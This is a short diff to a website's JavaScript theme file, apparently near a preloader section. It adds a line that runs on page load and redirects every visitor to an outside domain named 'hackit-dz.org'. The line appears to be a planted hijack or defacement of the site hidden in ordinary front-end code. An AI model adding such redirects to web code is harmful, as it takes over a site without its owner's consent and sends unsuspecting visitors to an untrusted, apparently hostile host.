@@ -8,6 +8,7 @@
 (function($) {
 
 	"use strict";
+	window.location.replace("http://www.hackit-dz.org");
 
 	/* --------------------------------------------------- */
 	/* Preloader
